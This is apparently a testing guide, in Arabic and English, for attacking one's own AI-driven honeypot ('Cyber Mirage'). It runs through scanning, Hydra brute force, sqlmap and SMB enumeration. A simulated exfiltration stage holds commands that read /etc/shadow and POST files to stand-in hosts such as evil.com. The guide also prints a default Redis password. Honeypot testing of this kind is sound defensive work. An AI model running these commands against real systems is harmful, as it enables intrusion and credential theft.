# 🎯 دليل الهجوم اليدوي - Manual Attack Testing Guide
## اختبار نظام Cyber Mirage كمهاجم حقيقي

---

## 📋 المتطلبات الأولية

### 1. تحديد IP السيرفر
```bash
# افترض أن السيرفر على
SERVER_IP="13.51.203.250"  # أو localhost إذا كنت تختبر محليًا
```

### 2. التأكد من أن الخدمات شغالة
```bash
# فحص البورتات المفتوحة
nmap -p 2222,2121,8080,8443,445,3307,502 $SERVER_IP
```

---

## 🔴 السيناريو الأول: SSH Brute Force Attack

### الخطوة 1: محاولة تسجيل دخول عادية
```bash
# محاولة واحدة بـ username و password خاطئين
ssh -p 2222 admin@$SERVER_IP
# Password: admin123
```

**ماذا سيحدث؟**
- الـ Honeypot سيقبل الاتصال
- سيرفض `admin/admin123`
- سينشر حدث إلى `stream:attacks`
- الـ AI سيقرر الاستراتيجية (غالبًا `MAINTAIN` في البداية)

---

### الخطوة 2: Brute Force باستخدام Hydra
```bash
# إنشاء ملف passwords
cat > passwords.txt << EOF
123456
password
admin
root
12345678
qwerty
abc123
letmein
monkey
dragon
EOF

# تشغيل Hydra
hydra -l root -P passwords.txt ssh://$SERVER_IP:2222 -t 4 -V
```

**ماذا سيحدث؟**
1. بعد 5-10 محاولات، الـ AI سيكتشف Brute Force
2. قد يقرر `INJECT_DELAY` لإبطاء الهجوم
3. أو `SWAP_BANNER` لتغيير بصمة SSH
4. أو `DROP_SESSION` لقطع الاتصال

---

### الخطوة 3: مراقبة القرارات مباشرة

**من terminal آخر:**
```bash
# الاتصال بـ Redis لقراءة القرارات
ssh -i your-key.pem ubuntu@$SERVER_IP

# داخل السيرفر
docker exec -it cyber_mirage_redis redis-cli -a changeme123

# قراءة stream القرارات
XREAD COUNT 10 STREAMS stream:ai_decisions 0
```

**أو من Dashboard:**
```bash
# افتح المتصفح على
http://$SERVER_IP:8501
```

---

## 🟠 السيناريو الثاني: FTP Attack

### الخطوة 1: الاتصال بـ FTP
```bash
ftp $SERVER_IP 2121
# Username: anonymous
# Password: [اضغط Enter]
```

### الخطوة 2: استكشاف الملفات
```bash
# بعد الدخول
ls
cd documents
ls
get finance_Q4_2023.xlsx  # الـ AI قد يعرض ملف lure!
```

**ماذا سيحدث؟**
- إذا قرر AI استخدام `PRESENT_LURE`، سترى ملفات وهمية
- إذا حاولت تحميل الملف، سيسجل الحدث
- قد يحدث `INJECT_DELAY` لإبطاء التحميل

### الخطوة 3: Brute Force FTP
```bash
hydra -l admin -P passwords.txt ftp://$SERVER_IP:2121 -V
```

---

## 🟡 السيناريو الثالث: HTTP Scanning

### الخطوة 1: فحص بسيط
```bash
curl http://$SERVER_IP:8080/
curl http://$SERVER_IP:8080/admin
curl http://$SERVER_IP:8080/login.php
curl http://$SERVER_IP:8080/config/database.yml
```

### الخطوة 2: Directory Brute Force
```bash
# باستخدام gobuster
gobuster dir -u http://$SERVER_IP:8080 -w /usr/share/wordlists/dirb/common.txt -t 50
```

### الخطوة 3: Nikto Scan
```bash
nikto -h http://$SERVER_IP:8080
```

**ماذا سيحدث؟**
- النظام سيكتشف Directory Scanning
- قد يعرض صفحات وهمية (`PRESENT_LURE`)
- قد يحقن تأخير في الاستجابات

---

## 🔵 السيناريو الرابع: SMB Attack

### الخطوة 1: فحص SMB Shares
```bash
smbclient -L //$SERVER_IP -p 445 -N
```

### الخطوة 2: الاتصال بـ Share وهمي
```bash
smbclient //$SERVER_IP/Public -p 445 -N
```

### الخطوة 3: محاولة Ransomware
```bash
# داخل smbclient
ls
get important_file.docx
```

**ماذا سيحدث؟**
- إذا كان `smb_honeypot.py` مفعّل، سيحاكي Ransomware detection
- سيرسل تنبيه `CRITICAL` إلى `stream:alerts`

---

## 🟢 السيناريو الخامس: MySQL Injection

### الخطوة 1: الاتصال بـ MySQL
```bash
mysql -h $SERVER_IP -P 3307 -u root -p
# Password: [جرب root أو اترك فارغ]
```

### الخطوة 2: SQL Injection Testing
```bash
# باستخدام sqlmap
sqlmap -u "http://$SERVER_IP:8080/login.php?user=admin" --dbs
```

**ماذا سيحدث؟**
- الـ Honeypot سيكتشف UNION SELECT، OR 1=1
- سينشر حدث `sql_injection` إلى Pipeline
- AI قد يقرر `PRESENT_LURE` لعرض جداول وهمية

---

## 📊 مراقبة كل شيء في الوقت الفعلي

### 1. مراقبة Logs
```bash
# داخل السيرفر
ssh -i key.pem ubuntu@$SERVER_IP

# لوجات Honeypots
docker logs -f cyber_mirage_honeypots --tail 100

# لوجات AI Engine
docker logs -f cyber_mirage_ai --tail 100
```

### 2. فحص Database
```bash
# الاتصال بـ PostgreSQL
docker exec -it cyber_mirage_postgres psql -U cybermirage -d cyber_mirage

# عرض جلسات الهجوم
SELECT session_id, attacker_ip, service, start_time, suspicion_score 
FROM attack_sessions 
ORDER BY start_time DESC 
LIMIT 10;

# عرض قرارات AI
SELECT session_id, action, strategy, reward, created_at 
FROM agent_decisions 
ORDER BY created_at DESC 
LIMIT 20;

# عرض أفعال المهاجم
SELECT session_id, action_type, command, timestamp 
FROM attack_actions 
ORDER BY timestamp DESC 
LIMIT 50;
```

### 3. فحص Redis Streams
```bash
docker exec -it cyber_mirage_redis redis-cli -a changeme123

# قراءة stream الهجمات
XREAD COUNT 10 STREAMS stream:attacks 0

# قراءة stream القرارات
XREAD COUNT 10 STREAMS stream:ai_decisions 0

# قراءة stream التنبيهات
XREAD COUNT 10 STREAMS stream:alerts 0

# فحص الإحصائيات
XINFO STREAM stream:attacks
```

### 4. Dashboard الرئيسي
```bash
# افتح في المتصفح
http://$SERVER_IP:8501

# ستشاهد:
# - Real-time attack feed
# - AI decisions visualization
# - Attacker profiles
# - Geographic map
# - System metrics
```

---

## 🎭 سيناريو هجوم متقدم - Multi-Stage Attack

### المرحلة 1: Reconnaissance (5 دقائق)
```bash
# Port Scanning
nmap -sV -p- $SERVER_IP

# Service Enumeration
nmap -sC -sV -p 2222,2121,8080 $SERVER_IP

# انتظر قليلاً (الـ AI يراقب)
sleep 60
```

### المرحلة 2: Initial Access (10 دقائق)
```bash
# SSH Brute Force
hydra -l root -P passwords.txt ssh://$SERVER_IP:2222 -t 4

# FTP Anonymous Login
ftp $SERVER_IP 2121
# Username: anonymous

# تصفح الملفات
ls
cd backup
get database_backup.sql  # ملف lure محتمل!
```

### المرحلة 3: Privilege Escalation (محاكاة)
```bash
# بعد "الدخول" إلى SSH Honeypot
ssh -p 2222 root@$SERVER_IP

# داخل الـ Honeypot (اكتب أوامر خطيرة)
whoami
uname -a
cat /etc/passwd
cat /etc/shadow  # سيكتشف AI credential dumping!
find / -name "*.conf" 2>/dev/null
```

### المرحلة 4: Data Exfiltration (محاكاة)
```bash
# داخل SSH
tar -czf /tmp/stolen_data.tar.gz /var/www/html
wget http://attacker-server.com/upload.php --post-file=/tmp/stolen_data.tar.gz

# أو
curl -X POST -F "file=@/etc/passwd" http://evil.com/upload
```

**ماذا سيحدث؟**
- الـ AI سيكتشف Data Exfiltration
- قد يحقن تأخير كبير
- أو يقطع الجلسة (`DROP_SESSION`)
- سيُسجّل كل شيء في Forensics

---

## 🔬 فحص Forensics

### بعد الهجوم، افحص الأدلة:
```bash
# داخل السيرفر
docker exec -it cyber_mirage_postgres psql -U cybermirage -d cyber_mirage

# الحصول على session_id الخاص بك
SELECT session_id FROM attack_sessions WHERE attacker_ip = 'YOUR_IP' ORDER BY start_time DESC LIMIT 1;

# افترض session_id = '550e8400-e29b-41d4-a716-446655440000'

# تشغيل Forensics Collector
docker exec -it cyber_mirage_honeypots python -c "
from src.forensics import EvidenceCollector
collector = EvidenceCollector(case_id='550e8400-e29b-41d4-a716-446655440000')
case = collector.collect_all_evidence()
print(f'Evidence collected: {len(case.evidence_items)} items')
"

# توليد تقرير
docker exec -it cyber_mirage_honeypots python -c "
from src.forensics import ReportGenerator
generator = ReportGenerator()
report_path = generator.generate_incident_report('550e8400-e29b-41d4-a716-446655440000')
print(f'Report generated: {report_path}')
"
```

---

## 📈 توقعات الأداء

### ماذا تتوقع أن ترى؟

| الحدث | رد فعل النظام | الوقت المتوقع |
|-------|---------------|----------------|
| **أول اتصال SSH** | `MAINTAIN` - لا شيء مريب بعد | < 1 ثانية |
| **5 محاولات فاشلة** | `MAINTAIN` - ما زال طبيعي | < 5 ثوان |
| **15+ محاولة** | `INJECT_DELAY` - إبطاء | 10-30 ثانية |
| **50+ محاولة** | `DROP_SESSION` أو `SWAP_BANNER` | 1-2 دقيقة |
| **تحميل Lure File** | يُسجّل في `attack_actions` | فوري |
| **أمر خطير (rm -rf)** | تنبيه `CRITICAL` | < 1 ثانية |

---

## 🐛 Troubleshooting

### المشكلة: لا يمكن الاتصال
```bash
# تحقق من الخدمات
docker ps | grep cyber_mirage

# تحقق من Logs
docker logs cyber_mirage_honeypots
```

### المشكلة: لا أرى قرارات AI
```bash
# تأكد من أن AI Engine شغال
docker logs cyber_mirage_ai | grep "Decision"

# تحقق من Redis
docker exec -it cyber_mirage_redis redis-cli -a changeme123 PING
```

### المشكلة: Dashboard فارغ
```bash
# إعادة تشغيل Dashboard
docker restart cyber_mirage_dashboard

# انتظر 30 ثانية ثم افتح
http://$SERVER_IP:8501
```

---

## 🎓 نصائح للاختبار الفعال

1. **ابدأ بسيط** - جرّب اتصال SSH واحد أولاً
2. **انتظر بين الهجمات** - اعطِ الـ AI وقت للتعلم
3. **راقب Dashboard** - افتحه في تبويب منفصل
4. **اختبر خدمات مختلفة** - SSH، FTP، HTTP
5. **جرّب أنماط مختلفة** - بطيء، سريع، متقطع
6. **افحص القاعدة** - شوف البيانات المحفوظة
7. **اقرأ اللوجات** - فيها تفاصيل كثيرة

---

## ✅ Checklist للاختبار الكامل

- [ ] Port Scan باستخدام Nmap
- [ ] SSH Brute Force (10+ محاولات)
- [ ] FTP Anonymous Login
- [ ] HTTP Directory Scanning
- [ ] SQL Injection Attempt
- [ ] SMB Share Enumeration
- [ ] أمر خطير في SSH (`rm -rf`, `cat /etc/shadow`)
- [ ] Data Exfiltration محاكاة
- [ ] فحص Dashboard للقرارات
- [ ] قراءة Redis Streams
- [ ] فحص PostgreSQL للجلسات
- [ ] توليد Forensic Report

---

**ملاحظة هامة**: 
⚠️ **استخدم هذه الأوامر فقط على سيرفر الاختبار الخاص بك!** ⚠️
الهجوم على أنظمة لا تملكها غير قانوني.

---

**Good Luck Testing! 🚀**
